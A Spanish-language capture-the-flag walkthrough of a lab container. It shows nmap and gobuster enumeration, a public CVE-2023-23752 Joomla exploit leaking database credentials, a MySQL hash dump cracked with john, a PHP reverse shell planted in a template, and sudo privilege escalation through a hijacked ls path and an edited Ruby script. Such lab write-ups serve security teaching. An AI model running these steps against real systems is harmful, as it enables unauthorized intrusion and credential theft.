# Enumeracion de Puertos, Servicios y Versioness

nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap

3306/tcp open  mysql   syn-ack ttl 64 MySQL 8.0.37-0ubuntu0.20.04.3
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-enum: 
|_  /wordpress/: Blog

por lo visto estamos frente un wordpress

# Fuzzing Web

gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 100 -x txt,php,jpg,png,html,py,js,css -b 404

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1868787 / 1868796 (100.00%)
===============================================================

si accedemos en http://172.17.0.2/wordpress/ nos conseguimos un login http://172.17.0.2/wordpress/index.php/login
intente inyecciones basicas sql y con sqlmap pero no es vulnerable, asi que hacemos fuzzing sobre /wordpress

gobuster dir -u http://172.17.0.2/wordpress -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 100 -x txt,php,jpg,png,html,py,js,css -b 404 

===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/media                (Status: 301) [Size: 318] [--> http://172.17.0.2/wordpress/media/]
/templates            (Status: 301) [Size: 322] [--> http://172.17.0.2/wordpress/templates/]
/modules              (Status: 301) [Size: 320] [--> http://172.17.0.2/wordpress/modules/]
/images               (Status: 301) [Size: 319] [--> http://172.17.0.2/wordpress/images/]
/plugins              (Status: 301) [Size: 320] [--> http://172.17.0.2/wordpress/plugins/]
/includes             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/includes/]
/index.php            (Status: 200) [Size: 29162]
/language             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/language/]
/components           (Status: 301) [Size: 323] [--> http://172.17.0.2/wordpress/components/]
/api                  (Status: 301) [Size: 316] [--> http://172.17.0.2/wordpress/api/]
/cache                (Status: 301) [Size: 318] [--> http://172.17.0.2/wordpress/cache/]
/libraries            (Status: 301) [Size: 322] [--> http://172.17.0.2/wordpress/libraries/]
/robots.txt           (Status: 200) [Size: 764]
/tmp                  (Status: 301) [Size: 316] [--> http://172.17.0.2/wordpress/tmp/]
/layouts              (Status: 301) [Size: 320] [--> http://172.17.0.2/wordpress/layouts/]
/administrator        (Status: 301) [Size: 326] [--> http://172.17.0.2/wordpress/administrator/]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 6755]
/cli                  (Status: 301) [Size: 316] [--> http://172.17.0.2/wordpress/cli/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
Progress: 1868787 / 1868796 (100.00%)
===============================================================

aqui podemos ver el /robots.txt y un /administrator 

si chequeamos el /robots.txt vemos:
___________________________
User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
__________________________

volvemos a ver el /administrator asi que si accedemos a el nos conseguimos con otro panel de login pero de joomla,
probamos inyeccion sql pero no parece ser vulnerable, asi que buscamos la version joomla a ver si existen exploit's
pero no esta visible la version, asi que buscando en internet, en hacktricks conseguimos como ver la version en 
joomla:
________________________________________________________________________________
Versión

    En /administrator/manifests/files/joomla.xml puedes ver la versión.

    En /language/en-GB/en-GB.xml puedes obtener la versión de Joomla.

    En plugins/system/cache/cache.xml puedes ver una versión aproximada
________________________________________________________________________________


por lo que si revisamos en :

http://172.17.0.2/wordpress/administrator/manifests/files/joomla.xml

podemos ver la version jommla: <version>4.0.3</version>

buscando en internet un exploit, se encuentra el cve: CVE-2023-23752
y el exploit que uso se encuentra en https://github.com/0xNahim/CVE-2023-23752/blob/main/exploit.py

ejecutamos el script:

python3 exploit.py -h

usage: CVE-2023-23752.py [-h] [-u URL] [-f]

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Target url, http://localhost:8080
  -f, --file         Change mode: Multiple targets
                                                     

ahora le pasamos la url al exploit

python3 CVE-2023-23752.py -u http://172.17.0.2/wordpress

[76] firstatack (firstatack) - firstatack@dockerlabs.es - Super Users
Site info
Sitename:Vulnerame otra vez 
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysql
DB host: 127.0.0.1
DB user: joomla_user
DB password: vuln
DB name: joomla_db
DB prefix: ffsnq_
DB encryption: 0
___________________________

hemos conseguido credenciales a una database mysql, que si recordamos el reporte de nmap
corre una db en el puerto 3306 (puerto por defecto de mysql), por lo que nos conectaremos

mysql -h 172.17.0.2 -u joomla_user -p --skip-ssl
pass:vuln

show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla_db          |
| performance_schema |
+--------------------+

use joomla_db					|para seleccionar la base de datos joomla_db
show tables;					| para listar las tablas de la base de datos joomla_db
.
.
.
ffsnq_users

de todas las tablas vamos a ver la infromacion de >> ffsnq_users <<

select * from ffsnq_users

pero como nos arroja toda la informacion de esa tabla, vamos a listar solo las colummnas que nos 
interesan: name y password

select name,password from ffsnq_users;

MySQL [joomla_db]> select name,password from ffsnq_users;
+------------+--------------------------------------------------------------+
| name       | password                                                     |
+------------+--------------------------------------------------------------+
| firstatack | $2y$10$UVmUci/wKgu7LFir7KIzP.NDup3lYDUxPzz7WZryvEYVdUjUVhou. |
+------------+--------------------------------------------------------------+

tenemos un resultado mas limpio y hemos obtenido un usuario y una password hasheada

firstatack:$2y$10$UVmUci/wKgu7LFir7KIzP.NDup3lYDUxPzz7WZryvEYVdUjUVhou.
-------------------------------------------------------------------------------------------------------

ahora vamos a intentar crackear el hash

echo '$2y$10$UVmUci/wKgu7LFir7KIzP.NDup3lYDUxPzz7WZryvEYVdUjUVhou.' > hash

john --wordlist=/home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt hash 
tequieromucho    (?)

firstatack:tequieromucho
________________________________________________________________________________________________________

iniciamos sesion por la web en http://172.17.0.2/wordpress/administrator/

una vez dentro, vamos a ------> Global Configuration >> Templates

aqui en Templates vamos a clickar en |X Close| y veremos >> Cassiopeia
clickamos en Cassiopeia y veremos una lista de archivos:


     css
     html
     images
     js
     scss
     component.php
     error.php
     index.php
     joomla.asset.json
     offline.php
     templateDetails.xml
     template_preview.png
     template_thumbnail.png

 
aqui yo editare el contenido de index.php, borrare todo su contenido y cargare una reverse shell php
y guardamos los cambios!!! Nos ponemos en escucha con netcat para luego llamar en: http://172.17.0.2/wordpress/index.php

en este punto si nos vamos a Netcat ya tenemos acceso como el user www-data


# Escalada

sudo -l						| solicita password
find / -perm -4000 2>/dev/null			| nada por aqui

revisamos los directorios de los usuarios del sistema y tenemos acceso al del user guadalupe,
en su directorio conseguimos un archivo llamado passwd que si lo leemos, la informacion esta codificada en base64
si la decodificamos en nuestra maquina:

-----------------------------------------------------------------------------------------------------------------
					en maquina atacante:

echo "UEsDBAoAAAAAANCN8FghMhsnBwAAAAcAAAAIABwAcGFzcy50eHRVVAkAAyfclmYn3JZmdXgLAAEE6AMAAAToAwAAc2hlZW5hClBLAQIeAwo
AAAAAANCN8FghMhsnBwAAAAcAAAAIABgAAAAAAAEAAACkgQAAAABwYXNzLnR4dFVUBQADJ9yWZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4A
AABJAAAAAAA=" |base64 -d

PK
Ѝ�X!ass.txtUT	'ܖf'ܖfux
                        ��sheena
PK
Ѝ�X!��pass.txtUT'ܖfux
                     ��PKNI 


pareciera que no a resultado y que fuera ilegible, pero si detallamos vemos: sheena
que si lo probamos como password del user guadalupe, resulta ser su password
------------------------------------------------------------------------------------------------------------------
su guadalupe
pass:sheena

ahora somos el user guadalupe
-----------------------------

sudo -l
    (ignacio) NOPASSWD: /usr/bin/scr1pt

sudo -u ignacio /usr/bin/scr1pt

Listando el directorio

index.html  wordpress
Listando otro directorio
/usr/bin/scr1pt: line 6: /snap/bin/ls: No such file or directory
_____________________________________________________________________

por lo que veo el script llama un archivo en /snap/bin/ls pero no existe
si nos vamos a /snap/bin/ y listamos conseguimos un archivo >> hola <<
el cual esta vacio, por lo que nos creamos un archivo llamado >> ls <<
que contenga >> /bin/bash y ejecutamos el script como el usuario ignario

cd /snap/bin/
echo '/bin/bash' > ls
chmod +x ls
sudo -u ignacio /usr/bin/scr1pt

ahora somos el usuario ignacio
_______________________________

sudo -l
    (ALL : ALL) NOPASSWD: /usr/bin/ruby /usr/bin/saludos.rb

ls -la /usr/bin/saludos.rb
-rwxrwx--- 1 ignacio ignacio 116 Jul 19 08:20 /usr/bin/saludos.rb

podemos modificar el script en ruby por lo que haremos lo siguiente:

echo "exec "/bin/bash"" >> /usr/bin/saludos.rb
sudo /usr/bin/ruby /usr/bin/saludos.rb
Feliz hacking
Aprendamos jugando y compartiendo info
Esta ya la tienes :-)
root@90dca0570671:/snap/bin# 
#root

Nos vemos en la proxima entrega!!! ;-)
